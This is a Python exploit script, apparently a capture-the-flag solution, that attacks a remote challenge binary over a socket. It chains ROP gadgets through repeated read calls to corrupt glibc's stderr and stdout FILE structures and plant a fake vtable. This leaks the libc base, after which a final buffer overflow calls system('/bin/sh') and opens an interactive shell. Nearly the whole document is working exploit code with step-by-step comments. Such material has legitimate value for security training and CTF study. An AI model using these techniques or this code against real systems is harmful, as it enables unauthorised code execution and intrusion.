from ptrlib import *
from time import sleep

elf = ELF("../distfiles/chall")
#"""
libc = ELF("../distfiles/libc-2.23.so")
sock = Socket("13.231.207.73", 9002)
"""
libc = ELF("../distfiles/libc-2.23.so")
sock = Socket("localhost", 9999)
#"""

rop_pop_r15 = 0x0040049b
rop_pop_rbp = 0x0040047c
rop_pop_rdi = 0x0040049c
rop_pop_rsi = 0x0040049e
rop_leave = 0x00400499
rop_ret = 0x0040047d
wait = 0.1

"""
[1] Overwrite stderr->_IO_write_ptr to leak libc base
"""
logger.info("Stage 1")
# 1-1) Create 2nd ROP chain around stderr
#  This ROP writes 2nd stage ROP chain.
#  The 2nd ROP chain sets rsi to the address of stderr.
payload = b'A' * 0x28
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stderr") - 8)
payload += p64(elf.plt("read")) # --> A
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stderr") + 8)
payload += p64(elf.plt("read")) # --> B
payload += p64(rop_pop_rbp)
payload += p64(elf.symbol("stderr") - 16)
payload += p64(rop_leave)
sock.send(payload) # vuln read
sleep(wait)

# 1-2) Send 2nd ROP chain
#  We have to split the payload in order not to corrupt stdin/out/err.
sock.send(p64(rop_pop_rsi)) # A <--
sleep(wait)

# 2-1) Create 4th ROP chain around stdout
#  This ROP writes 4th stage ROP chain.
#  The 4th ROP chain sets rsi to the address of stdout + 0x70.
payload  = p64(elf.plt("read")) # --> C (rsi=stderr)
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stdout") - 8)
payload += p64(elf.plt("read")) # --> D
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stdin") - 8)
payload += p64(elf.plt("read")) # --> E
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stderr") - 8)
payload += p64(elf.plt("read")) # --> F
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stderr") + 8)
payload += p64(elf.plt("read")) # --> G
payload += p64(rop_pop_rbp)
payload += p64(elf.symbol("stdout") - 16)
payload += p64(rop_leave)
sock.send(payload)          # B <--
sleep(wait)

# 1-3) Corrupt stderr->_IO_write_ptr
#  We increase the value of _IO_write_ptr.
#  This will cause _IO_jump_t->__overflow called before exiting.
#  (which leaks libc address)
payload  = p64(0xfbad1800) # _flags (= output as soon as possible)
payload += p64(0)          # _IO_read_ptr
payload += p64(0)          # _IO_read_end
payload += p64(0)          # _IO_read_base
payload += b'\x88'         # _IO_write_ptr
sock.send(payload) # C <--
sleep(wait)

"""
[2] We force stdout to flush the memory.
    Since we don't have any functions which flush stdout, we try to quit the program and cause stdout->_IO_jump_t->__IO_overflow called.
    We overwrite stderr->_IO_jump_t to call main before exiting and keep connection.
    In this way, we can leak libc base without killing the process.
"""
logger.info("Stage 2")
# 2-2) Send 4th ROP chain
#  We have to split the payload in order not to (completely) corrupt stderr.
assert 0x00 <= libc.symbol("_IO_2_1_stdout_") & 0xff <= 0x80
w = bytes([(libc.symbol("_IO_2_1_stdout_") & 0xff) + 0x70])
sock.send(p64(rop_pop_rsi) + w) # D <-- (partially overwrite)
sleep(wait)
sock.send(p64(rop_pop_r15))     # E <--
sleep(wait)
sock.send(p64(rop_pop_r15))     # F <--
sleep(wait)

# 3-1) Create 6th ROP chain around stdout
#  This ROP writes 6th stage ROP chain.
#  The 6th ROP chain sets rsi to the address of stdout.
payload  = p64(elf.plt("read")) # --> H (rsi=stdout + 0x70)
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stdout") - 8)
payload += p64(elf.plt("read")) # --> I
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stdin") - 8)
payload += p64(elf.plt("read")) # --> J
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stderr") - 8)
payload += p64(elf.plt("read")) # --> K
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("stderr") + 8)
payload += p64(elf.plt("read")) # --> L
payload += p64(rop_pop_rbp)
payload += p64(elf.symbol("stdout") - 16)
payload += p64(rop_leave)
sock.send(payload) # G <--
sleep(wait)

# 2-3) Corrupt stderr->_IO_jump_t
#  We make the vtable point to our fake vtable (which we will write later).
payload  = p64(2)
payload += p64(0xffffffffffffffff)
payload += p64(0) * 2
payload += p64(0xffffffffffffffff)
payload += p64(0) * 8
payload += p64(elf.section(".bss") + 0xf00) # fake vtable
sock.send(payload) # H <--
sleep(wait)

"""
[3] Overwrite stderr->_IO_write_ptr
    We changed stderr->_IO_jump_t but it's not enough because it won't call any function in the vtable.
    We overwrite stderr->_IO_write_ptr to make it call _IO_overflow_t before exiting, which instead calls main function.
"""
logger.info("Stage 3")
# 3-2) Send 6th ROP chain
#  This also fixes stdout pointer
w = bytes([libc.symbol("_IO_2_1_stdout_") & 0xff])
sock.send(p64(rop_pop_rsi) + w) # I <-- (restore stdout)
sleep(wait)
sock.send(p64(rop_pop_r15))     # J <--
sleep(wait)
sock.send(p64(rop_pop_r15))     # K <--
sleep(wait)

# 4-1) Create 8th ROP chain around stdout
#  This ROP writes 8th stage ROP chain.
#  The 8th ROP chain sets rsi to the address of stdout.
payload  = p64(elf.plt("read")) # --> M (rsi=stdout)
payload += p64(rop_pop_rsi)
payload += p64(elf.section(".bss") + 0x808)
payload += p64(elf.plt("read")) # --> N
payload += p64(rop_pop_rbp)
payload += p64(elf.section(".bss") + 0x800)
payload += p64(rop_leave) # need to pivot because exit consumes large memory
sock.send(payload) # L <--
sleep(wait)

# 3-3) Corrupt stdout->_IO_write_ptr
#  We increase the value of _IO_write_ptr.
#  This will cause _IO_jump_t->__overflow called before exiting.
#  (which actually calls main function)
payload  = p64(0xfbad1800) # _flags
payload += p64(0)          # _IO_read_ptr
payload += p64(0)          # _IO_read_end
payload += p64(0)          # _IO_read_base
payload += b'\x88'         # _IO_write_ptr
sock.send(payload) # M <--
sleep(wait)

"""
[4] Prepare fake _IO_jump_t and try to exit
"""
logger.info("Stage 4")
# 4-1) Final ROP chain to leak libc address
#  Now, prepare fake vtable and exit the program
payload  = p64(rop_pop_rsi)
payload += p64(elf.section(".bss") + 0xf00)
payload += p64(elf.plt("read")) # --> O (rsi=fake_IO_jump_t)
payload += p64(elf.plt("exit"))
sock.send(payload) # N <--
sleep(wait)

# 4-2) Send fake _IO_jump_t
payload = p64(0) * 3
payload += p64(elf.symbol("main"))
sock.send(payload) # O <--
sleep(wait)

# 4-3) leak libc base
#  In __run_exit_handler cleanups stderr-->stdout-->stdin as we call exit function.
#  First, stderr leaks memory since we changed _IO_write_ptr.
#  Second, stdout leaks memory and calls main function since we changed _IO_write_ptr and _IO_jump_t.
libc_base = u64(sock.recv()[0x20:0x28]) - libc.symbol("_IO_2_1_stdout_")
logger.info("libc base = " + hex(libc_base))

"""
[5] Baby BOF!
"""
logger.info("Stage 5 :tada:")
payload = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.send(payload)

sock.interactive()

